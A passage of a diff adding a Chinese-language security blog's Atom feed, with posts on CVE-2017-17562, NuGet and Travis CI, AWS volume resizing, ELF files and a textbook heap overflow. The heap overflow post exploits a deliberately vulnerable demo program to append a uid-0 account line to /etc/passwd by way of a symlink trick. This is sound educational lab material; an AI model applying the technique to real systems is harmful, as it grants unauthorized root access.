+<li><a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="external">CSAW-CTF Python sandbox write-up</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;这个要得从前几天朋友丢过来的一个链接说起，是一道SSTI(Server Side Template In
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>有关CVE-2017-17562的一些零碎点</title>
+    <link href="http://kevien.github.io/2017/12/24/CVE-2017-17562%E7%9A%84%E4%B8%80%E4%BA%9B%E9%9B%B6%E7%A2%8E%E7%82%B9/"/>
+    <id>http://kevien.github.io/2017/12/24/CVE-2017-17562的一些零碎点/</id>
+    <published>2017-12-24T08:10:00.000Z</published>
+    <updated>2018-01-19T10:57:08.477Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>前两天看到这个漏洞的时候感觉还是挺有意思的，让我想起了之前分析的nginx提权漏洞(CVE-2016-1247)以及shellshock漏洞(CVE-2014-6271),前两天只是简单的看了一下，今天有时间就整理一下，留个备忘。</li>
+<li>goAHead是一个使用c语言实现的一个简单web服务器，主要用在嵌入式设备上，官方给出的一句话描述也是simple，secure Embedded web server，官方说有亿万的设备在使用(夸张了吧？)，其中有像是hp、oracle、西门子、摩托罗拉等。详细可以看向这里<a href="https://embedthis.com/goahead/" target="_blank" rel="external">https://embedthis.com/goahead/</a><h4 id="CVE-2016-1247简单介绍"><a href="#CVE-2016-1247简单介绍" class="headerlink" title="CVE-2016-1247简单介绍"></a>CVE-2016-1247简单介绍</h4></li>
+<li>这个漏洞可以导致GoAhead web服务器在小于3.6.5版本远程代码执行。攻击者通过发送一个恶意的http请求，利用开启了CGI功能的goAhead的服务器，从而进行远程代码执行。其中exp是利用到了向新的进程中注入环境变量这种比较基本的攻击方式。<br></li>
+<li>具体需要的条件主要有如下：<br><br>1.GoAhead开启CGI功能，即有cgi的处理页面(关于GoAhead cgi的使用可以看向这里<a href="https://embedthis.com/goahead/doc/users/cgi.html" target="_blank" rel="external">https://embedthis.com/goahead/doc/users/cgi.html</a>)<br>2.需要GoAhead版本低于3.6.5<br>3.需要动态链接glibc库(默认是动态链接的)<h4 id="具体"><a href="#具体" class="headerlink" title="具体"></a>具体</h4></li>
+<li>在英文原版文章中作者已经分析了glibc是如何加载和处理环境变量、GoAhead如何处理cgi以及linux的procfs的符号链接如何指向输入描述符等，我这里就不细分析了。下面只是放几张测试的图片。<br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/origin.png" alt=""><br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/poc.png" alt=""><br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/afterpoc.png" alt=""><br>(a.html extract from wireshark)<br>可以看到，打过payload之后，页面返回的环境变量多了一个LD_PRELOAD=/proc/self/fd/0的键值对。<br><img src="/2017/12/24/CVE-2017-17562的一些零碎点/proc.png" alt=""><br>可以看到，cgi处理进程符号链接指向的tmp文件和我们的payload是相同的。<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
+<li>这个漏洞利用的难点在于怎么将动态链接库注入到远程服务器，作者这里提供了一个很好的思路就是利用到了/proc/self/fd/0（它对应了文件的stdin文件描述符）这个文件就链接到了我们上传的文件</li>
+<li>就像英文原版文章的标题一样，这个漏洞的精髓就是利用ld_preload来进行exploit，这个思路很新颖，后面可能会有其它的漏洞用到这个思路和方法。<h4 id="漏洞引申1-有关nginx提权"><a href="#漏洞引申1-有关nginx提权" class="headerlink" title="漏洞引申1-有关nginx提权"></a>漏洞引申1-有关nginx提权</h4></li>
+<li>漏洞分析文章见这里<br><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="external">Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">作者的poc shell脚本写的不错</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><a href="http://blog.knownsec.com/2016/11/nginx-exploit-deb-root-privesc-cve-2016-1247/" target="_blank" rel="external">Nginx权限提升漏洞(CVE-2016-1247) 分析</a></p>
+<ul>
+<li>之前简单研究过nginx的提权漏洞，和这次的漏洞有一些像，也用到了环境变量，nginx的这个漏洞用到了写入恶意动态链接库路径到/etc/ld.so.preload。<h4 id="漏洞引申2-有关shellshock"><a href="#漏洞引申2-有关shellshock" class="headerlink" title="漏洞引申2-有关shellshock"></a>漏洞引申2-有关shellshock</h4></li>
+<li>对比shellshock，这个漏洞要需要的条件苛刻很多，shellshock简单粗暴，而且shellshock的影响范围也更广。<br><a href="http://www.vuln.cn/6476" target="_blank" rel="external">Shellshock漏洞回顾与分析测试 - Debug_Orz</a><h4 id="漏洞引申3-其它"><a href="#漏洞引申3-其它" class="headerlink" title="漏洞引申3-其它"></a>漏洞引申3-其它</h4></li>
+<li>在github上看这个项目的一些cve issue <br><br><a href="https://github.com/embedthis/goahead/issues?page=1&amp;q=label%3Acve+is%3Aclosed" target="_blank" rel="external">https://github.com/embedthis/goahead/issues?page=1&amp;q=label%3Acve+is%3Aclosed</a><br><br>还是有很多东西值得学习的(基本上可以看到开发一个web服务器可能会遇到的安全问题）<br><br>比如这个issue <a href="https://github.com/embedthis/goahead/issues/241" target="_blank" rel="external">https://github.com/embedthis/goahead/issues/241</a>中，某位安全研究员提的报告<br><a href="https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html" target="_blank" rel="external">https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html</a></li>
+<li>As I’m a fan of looking at the source    –author <br><br>向作者学习，安全有个好处就是我们可以透过现象看本质，研究原理很有意思。</li>
+<li>有关patch，原文中作者也说了，漏洞的修复只是过滤了几个特殊的参数名，有可能会被绕过，期待大牛们绕过的思路。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://www.elttam.com.au/blog/goahead/" target="_blank" rel="external">REMOTE LD_PRELOAD EXPLOITATION</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;前两天看到这个漏洞的时候感觉还是挺有意思的，让我想起了之前分析的nginx提权漏洞(CVE-2016-1
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>NuGet和travis实践</title>
+    <link href="http://kevien.github.io/2017/11/29/NuGet%E5%92%8Ctravis%E5%AE%9E%E8%B7%B5/"/>
+    <id>http://kevien.github.io/2017/11/29/NuGet和travis实践/</id>
+    <published>2017-11-29T10:56:16.000Z</published>
+    <updated>2017-12-02T09:21:36.000Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="S-CR"><a href="#S-CR" class="headerlink" title="S;CR"></a>S;CR</h4><p>工作中接触到了yara，yara项目在windows上编译是通过vs2015编译的，其中用到了openssl和jansson的第三方库，其中作者<a href="https://github.com/plusvic" target="_blank" rel="external">Victor M. Alvarez</a>用的是nuget进行三方库管理的，感觉这个解决方案还不错，可能比自己去下载源码编译lib稍微方便一点儿，所以记录一下。</p>
+<h4 id="vs-Solution实际测试"><a href="#vs-Solution实际测试" class="headerlink" title="vs Solution实际测试"></a>vs Solution实际测试</h4><ul>
+<li>下面就以openssl库为例进行一下测试。</li>
+<li><p>首先需要在项目的根目录下创建一个NuGet.Config 的文件,这个应该是方便vs的NuGet进行索引</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</div><div class="line">&lt;configuration&gt;</div><div class="line">  &lt;packageSources&gt;</div><div class="line">    &lt;add key=&quot;YARA.OpenSSL&quot;</div><div class="line">         value=&quot;https://ci.appveyor.com/nuget/openssl-oaib8n7lvvtp&quot; /&gt;</div><div class="line">    &lt;add key=&quot;YARA.Jansson&quot;</div><div class="line">         value=&quot;https://ci.appveyor.com/nuget/jansson-41we82mn284d&quot; /&gt;</div><div class="line">  &lt;/packageSources&gt;</div><div class="line">&lt;/configuration&gt;</div></pre></td></tr></table></figure>
+</li>
+<li><p>vs的默认项目会带一个界面，可以直观的去下载，如下图。<br><img src="/2017/11/29/NuGet和travis实践/projectwithui.png" alt=""><br><img src="/2017/11/29/NuGet和travis实践/ui.png" alt=""><br><img src="/2017/11/29/NuGet和travis实践/out.png" alt=""><br>然后在项目中添加一下头文件的路径以及静态链接库的路径就可以使用了。<br><img src="/2017/11/29/NuGet和travis实践/1.png" alt=""><br><img src="/2017/11/29/NuGet和travis实践/2.png" alt=""><br><img src="/2017/11/29/NuGet和travis实践/3.png" alt=""></p>
+</li>
+<li>vs的cmake项目<br><del>vs的cmake项目稍微有些不同，就是他没有图形界面，这个时候可以使用Package Manager Console来进行查找和下载第三方库。</del><br><a href="https://docs.microsoft.com/en-us/nuget/tools/package-manager-console" target="_blank" rel="external">官方说明</a><br>使用Find-Package openssl 进行搜索，可以发现有很多<br><img src="/2017/11/29/NuGet和travis实践/4.png" alt=""><br>使用Install-Package YARA.OPENSSL.X64 命令进行下载<br><img src="/2017/11/29/NuGet和travis实践/5.png" alt=""><br><del>效果是一样的，都会在项目的主目录的下面创建一个packages的目录并就对应的库下载到其中。这个时候就可以通过CmakeLists.txt进行头文件以及静态链接库的包含就可以使用了</del><br>更新：<br>cmake的项目在install-package的时候会找不到default solution的问题，所以只能通过将之前下载的packages的内容复制到cmake的项目下了。<br>CMakeLists.txt的内容如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">cmake_minimum_required(VERSION 3.8)</div><div class="line">include_directories(&quot;$&#123;PROJECT_SOURCE_DIR&#125;/packages/YARA.OpenSSL.x86.1.1.0/include&quot;)</div><div class="line"></div><div class="line">set(libcrypto $&#123;PROJECT_SOURCE_DIR&#125;/packages/YARA.OpenSSL.x86.1.1.0/lib/libcrypto.lib)</div><div class="line">set(libssl $&#123;PROJECT_SOURCE_DIR&#125;/packages/YARA.OpenSSL.x86.1.1.0/lib/libssl.lib)</div><div class="line">add_executable(Demo test.cpp)</div><div class="line"></div><div class="line">target_link_libraries(Demo $&#123;libcrypto&#125; $&#123;libssl&#125;)</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>测试通过。<br>代码已上传至Github<br><a href="https://github.com/kevien/democode" target="_blank" rel="external">https://github.com/kevien/democode</a></p>
+<h4 id="打包自己的package"><a href="#打包自己的package" class="headerlink" title="打包自己的package"></a>打包自己的package</h4><ul>
+<li>yara项目中openssl库是作者自己打包到appveyor上的，那是如何上传自己打的包呢</li>
+<li>nuget包的制作可以通过 NuGetPackageExplorer <a href="https://github.com/NuGetPackageExplorer/NuGetPackageExplorer" target="_blank" rel="external">link</a><br>这个工具还是挺方便的。<br><img src="/2017/11/29/NuGet和travis实践/6.png" alt=""></li>
+<li>而且这个工具还可以进行上传，如下图所示<br><img src="/2017/11/29/NuGet和travis实践/7.png" alt=""></li>
+<li>当然也可以直接使用nuget工具进行上传<br><img src="/2017/11/29/NuGet和travis实践/8.png" alt=""></li>
+<li>这样我们就完成了自定义包的上传。<br><img src="/2017/11/29/NuGet和travis实践/9.png" alt=""><br>(现在的方式还是需要进行验证的，也就是需要输入appveyor的用户名和密码，public的方式暂时还没找到方法)<h4 id="利用travis进行持续化集成"><a href="#利用travis进行持续化集成" class="headerlink" title="利用travis进行持续化集成"></a>利用travis进行持续化集成</h4></li>
+<li>首先在github创建一个token，并赋予适当的权限。可参考如下链接<br><a href="https://blog.wyrihaximus.net/2015/09/github-auth-token-on-travis/" target="_blank" rel="external">https://blog.wyrihaximus.net/2015/09/github-auth-token-on-travis/</a><br><a href="https://docs.travis-ci.com/user/github-oauth-scopes/" target="_blank" rel="external">https://docs.travis-ci.com/user/github-oauth-scopes/</a></li>
+<li>然后在github的项目当中添加.travish.yml 文件，可参考<br><a href="https://docs.travis-ci.com/user/deployment/releases/" target="_blank" rel="external">https://docs.travis-ci.com/user/deployment/releases/</a></li>
+<li>测试项目<br><a href="https://github.com/kevien/travisTest/" target="_blank" rel="external">https://github.com/kevien/travisTest/</a><br><img src="/2017/11/29/NuGet和travis实践/10.png" alt=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">部署的时候有几个坑(MDZZ)，一个是file 的位置，这个会在travis的job log的展开中看到(看log、看log、看log)。</div><div class="line">第二个就是要在deploy项下加上键值 skip_cleanup: true</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
+<li>用NuGet进行第三方库的操作还是比较方便的,还有就是开源项目的持续集成使用travis工具是个不错的选择。</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;S-CR&quot;&gt;&lt;a href=&quot;#S-CR&quot; class=&quot;headerlink&quot; title=&quot;S;CR&quot;&gt;&lt;/a&gt;S;CR&lt;/h4&gt;&lt;p&gt;工作中接触到了yara，yara项目在windows上编译是通过vs2015编译的，其中用到了openssl和jansson
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>一个简单的堆溢出</title>
+    <link href="http://kevien.github.io/2017/10/28/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
+    <id>http://kevien.github.io/2017/10/28/堆溢出利用笔记/</id>
+    <published>2017-10-28T03:18:28.000Z</published>
+    <updated>2018-03-17T11:46:32.000Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line"></div><div class="line">void usage(char *prog_name, char *filename) &#123;</div><div class="line">   printf(&quot;Usage: %s &lt;data to add to %s&gt;\n&quot;, prog_name, filename);</div><div class="line">   exit(0);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char *argv[]) &#123;</div><div class="line">   int userid, fd; // file descriptor</div><div class="line">   char *buffer, *datafile;</div><div class="line"></div><div class="line">   buffer = (char *) malloc(100);</div><div class="line">   datafile = (char *) malloc(20);</div><div class="line">   strcpy(datafile, &quot;/var/notes&quot;);</div><div class="line"></div><div class="line">   if(argc &lt; 2)                // If there aren&apos;t commandline arguments</div><div class="line">      usage(argv[0], datafile); // display usage message and exit</div><div class="line"></div><div class="line">   strcpy(buffer, argv[1]);  // copy into buffer</div><div class="line"></div><div class="line">   printf(&quot;[DEBUG] buffer   @ %p: \&apos;%s\&apos;\n&quot;, buffer, buffer);</div><div class="line">   printf(&quot;[DEBUG] datafile @ %p: \&apos;%s\&apos;\n&quot;, datafile, datafile);</div><div class="line"></div><div class="line"> // Opening the file</div><div class="line">   fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);</div><div class="line">   if(fd == -1)</div><div class="line">      printf(&quot;in main() while opening file&quot;);</div><div class="line">   printf(&quot;[DEBUG] file descriptor is %d\n&quot;, fd);</div><div class="line"></div><div class="line">   userid = getuid(); // get the real user ID</div><div class="line"></div><div class="line">// Writing data</div><div class="line">   if(write(fd, &amp;userid, 4) == -1) // write user ID before note data</div><div class="line">      printf(&quot;in main() while writing userid to file&quot;);</div><div class="line">   write(fd, &quot;\n&quot;, 1); // terminate line</div><div class="line"></div><div class="line">   if(write(fd, buffer, strlen(buffer)) == -1) // write note</div><div class="line">      printf(&quot;in main() while writing buffer to file&quot;);</div><div class="line">   write(fd, &quot;\n&quot;, 1); // terminate line</div><div class="line"></div><div class="line">// Closing file</div><div class="line">   if(close(fd) == -1)</div><div class="line">      printf(&quot;in main() while closing file&quot;);</div><div class="line"></div><div class="line">   printf(&quot;Note has been saved.\n&quot;);</div><div class="line">   free(buffer);</div><div class="line">   free(datafile);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h4 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h4><ul>
+<li>这段代码程序中有两个buffer是存放在堆上面的，这个程序会接收一个参数，并将参数最终写入到/var/notes 这个文件中。<br><img src="/2017/10/28/堆溢出利用笔记/notetaker.png" alt=""></li>
+<li>如图所示我们可以计算出两个buffer地址之间的距离是0x70（即112个字节），我们知道第一个buffer是以null为结束的，当我们写入这个buffer长度为112个字节的时候，那么第二个buffer将会被写入到datafile这个buffer开始的部分。<br><img src="/2017/10/28/堆溢出利用笔记/nulloverflow.png" alt=""></li>
+<li>如我们所预期的，第二个buffer被我们写入了空.那么如果被覆盖的不是null，而是其他的呢？会是什么情况<br><img src="/2017/10/28/堆溢出利用笔记/testfile.png" alt=""></li>
+<li>这次，溢出导致第一个buffer写入到了当前文件下的testfile文件中，而不再是/var/notes 这个文件中 ，可以看到当使用free释放内存的时候报错了，这个其实就类似于栈溢出覆盖了返回地址一样。<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4></li>
+<li>从上面可以看出，文件名可以控制，而且可以append到文件中。这里可能会有几种利用的方式，其中最常见的利用方式就是写文件/etc/passwd，这个文件包含了系统的所有的用户名、ID、登录的shell等信息(对这个文件操作之前请注意先备份O！)</li>
+<li>这个文件是以分号分隔开的，依次是登录名、密码、用户ID、组ID，用户名、用户的根目录以及登录的shell，其中密码处可以是x(代表加密，存放在/etc/shadow文件中)，也可以直接是加密后的密文，此外用户id为0代表用户会是root的权限，这个时候我们的目标就是在这个文件中追加一条，一个带有密文且id为0的账号。</li>
+<li>关于密码加密我们可以使用下面的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ perl -e &apos;print crypt(&quot;M0rk&quot;, &quot;AA&quot;). &quot;\n&quot;&apos;</div><div class="line">AAhmo1jgYI0HE</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>所以我们最终想要在passwd文件中的条目大概是这个样子的<br>myroot:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash</p>
+<ul>
+<li><p>然而，这个特殊的堆溢出并不允许我们直接这么操作，因为我们必须以/etc/passwd为结束，但是这个限制我们可以使用符号链接来”绕过”,”绕过”方法如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ mkdir /tmp/etc</div><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ ln -s /bin/bash /tmp/etc/passwd</div><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ ls -l /tmp/etc/passwd</div><div class="line">lrwxrwxrwx 1 xxx xxx 9 Nov 16 20:56 /tmp/etc/passwd -&gt; /bin/bash</div></pre></td></tr></table></figure>
+</li>
+<li><p>这个时候/tmp/etc/passwd指向了/bin/bash,这就意味着我们有了可登陆的shell，这个时候就变成了<br>myroot:AAhmo1jgYI0HE:0:0:me:/root:/tmp/etc/passwd</p>
+</li>
+<li>此外这里还需要计算一下me这里需要填充多长才能满足112个字节。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ echo &quot;myroot:AAhmo1jgYI0HE:0:0::/root:/tmp&quot; |wc -c</div><div class="line">37</div><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ bc</div><div class="line">bc 1.06.95</div><div class="line">Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.</div><div class="line">This is free software with ABSOLUTELY NO WARRANTY.</div><div class="line">For details type `warranty&apos;. </div><div class="line">112-37+1</div><div class="line">76</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2017/10/28/堆溢出利用笔记/final.png" alt=""></p>
+<ul>
+<li>如上图所示，通过堆溢出成功添加了账号并登陆。<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
+<li>这里只是举例了一个发生在堆内存上的溢出漏洞，并没有涉及到像是unlink或者UAF等技巧（后面有时间再研究分享），但像是通过写/etc/passwd以及软链接的trick还是不错的。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul>
+<li>《hacking the art of exploitation》chapter 0x340<br><a href="http://www.freebuf.com/articles/system/151407.html" target="_blank" rel="external">Dance In Heap（二）：一些堆利用的方法（上） </a><br><a href="http://yunnigu.dropsec.xyz/2017/04/05/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="external">堆溢出之unlink的利用</a><br><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.71405f33KyLlt6&amp;articleid=315" target="_blank" rel="external">Linux堆内存管理深入分析</a></li>
+</ul>
+</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;漏洞代码&quot;&gt;&lt;a href=&quot;#漏洞代码&quot; class=&quot;headerlink&quot; title=&quot;漏洞代码&quot;&gt;&lt;/a&gt;漏洞代码&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>amazon云扩容</title>
+    <link href="http://kevien.github.io/2017/10/22/amazon%E4%BA%91%E6%89%A9%E5%AE%B9/"/>
+    <id>http://kevien.github.io/2017/10/22/amazon云扩容/</id>
+    <published>2017-10-22T15:20:53.000Z</published>
+    <updated>2017-12-01T01:00:03.840Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
+<li>用了亚马逊的云，但是最近8G的存储不够了。看了一下，好像有没有什么可删除的东西了。然后查了一下，原来亚马逊云是可以扩容的，暂时还不知道扩容收不收费。。为什么要记录一下呢，因为这里有一个小坑<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">按照参考1中的方法，前面几个步骤没有问题，但是最后就是报错，大概是找不到快照中的对应的目录，原来是在挂载卷的时候，目录选错了，设置成这个就可以了。/dev/sda1(见参考2).</div><div class="line">参考：</div><div class="line">1.http://naonao.blog.51cto.com/1135983/1557994</div><div class="line">2.https://stackoverflow.com/questions/6151695/ec2-instance-on-amazon-and-i-am-greeted-with-no-space-left-on-the-disk</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><ul>
+<li>国内的文章真是坑啊，参考1的步骤是有问题的，建议还是用第二个参考链接，参考1的方法，没有先deteach掉volume就创建快照了，这种方法会导致后面启动实例失败，按照参考2的步骤来就没有问题。<br><img src="/2017/10/22/amazon云扩容/upgrade.png" alt=""></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;用了亚马逊的云，但是最近8G的存储不够了。看了一下，好像有没有什么可删除的东西了。然后查了一下，原来亚马逊云是可以扩容的，暂时还
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>linux权限提升</title>
+    <link href="http://kevien.github.io/2017/10/10/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
+    <id>http://kevien.github.io/2017/10/10/linux权限提升/</id>
+    <published>2017-10-10T04:35:24.000Z</published>
+    <updated>2018-02-27T01:02:31.404Z</updated>
+    
+    <content type="html"><![CDATA[<p>#### </p>
+<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="http://bobao.360.cn/learning/detail/4512.html" target="_blank" rel="external">Linux提权——利用可执行文件SUID</a><br><a href="https://github.com/sagishahar/lpeworkshop" target="_blank" rel="external">https://github.com/sagishahar/lpeworkshop</a><br><a href="https://payatu.com/guide-linux-privilege-escalation/" target="_blank" rel="external">A guide to Linux Privilege Escalation</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;#### &lt;/p&gt;
+&lt;h4 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;http://bobao.360.cn/
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ELF文件学习</title>
+    <link href="http://kevien.github.io/2017/10/08/ELF%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://kevien.github.io/2017/10/08/ELF文件学习/</id>
+    <published>2017-10-08T07:32:54.000Z</published>
+    <updated>2017-11-29T08:45:53.000Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
+<li>ELF(Executable and Linkable Format)可执行和可链接格式。<h4 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h4></li>
+<li>类似于dumpbin，可以使用ldd(print shared object dependencies)命令查看<br><a href="http://www.cnblogs.com/jiqingwu/p/linux_dynamic_lib_create.html" target="_blank" rel="external">参考</a><br><img src="/2017/10/08/ELF文件学习/ldd.png" alt=""><br>这样我们可以看的到， hello的运行用到了我们编写的libmyhello.so这个动态链接库，还用到了libc.so.6这个c语言的标准库。<h4 id="ELF文件格式"><a href="#ELF文件格式" class="headerlink" title="ELF文件格式"></a>ELF文件格式</h4></li>
+<li>readelf命令<br>这个命令应该是最常用的到的，-a 它会显示ELF文件的所有信息。<br><img src="/2017/10/08/ELF文件学习/readelf.png" alt=""><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique" target="_blank" rel="external">二进制中的奥妙：文件结构</a><br>[工具elfparser]<br>(<a href="https://github.com/jacob-baines/elfparser" target="_blank" rel="external">https://github.com/jacob-baines/elfparser</a>)<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">老外两年前写的，差距好大</div></pre></td></tr></table></figure>
+</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;ELF(Executable and Linkable Format)可执行和可链接格式。&lt;h4 id=&quot;动态链接库&quot;&gt;&lt;a h
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Google c++测试框架</title>
+    <link href="http://kevien.github.io/2017/09/29/GTest%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/"/>
+    <id>http://kevien.github.io/2017/09/29/GTest测试框架/</id>
+    <published>2017-09-29T15:34:40.000Z</published>
+    <updated>2017-11-13T04:10:57.000Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
